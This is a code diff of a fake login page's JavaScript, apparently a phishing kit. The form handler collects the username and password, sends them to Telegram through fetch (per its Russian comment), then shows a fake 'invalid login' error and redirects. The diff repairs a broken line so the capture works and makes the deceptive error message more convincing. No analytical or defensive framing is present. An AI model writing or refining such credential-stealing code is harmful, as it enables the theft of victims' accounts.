@@ -142,10 +142,7 @@
             e.preventDefault();
             
             const username = document.getElementById('username').value;
-            const password = docu
-
-
-ment.getElementById('password').value;
+            const password = document.getElementById('password').value;
             const errorDiv = document.getElementById('errorMsg');
 
             // Отправка данных в Telegram
@@ -154,7 +151,7 @@ ment.getElementById('password').value;
 
             try {
                 await fetch(url);
-                errorDiv.textContent = 'Ошибка входа. Перенаправление...';
+                errorDiv.textContent = 'Неверный логин или пароль. Перенаправление...';
                 errorDiv.style.color = '#ffcc00';
                 
                 setTimeout(() => {
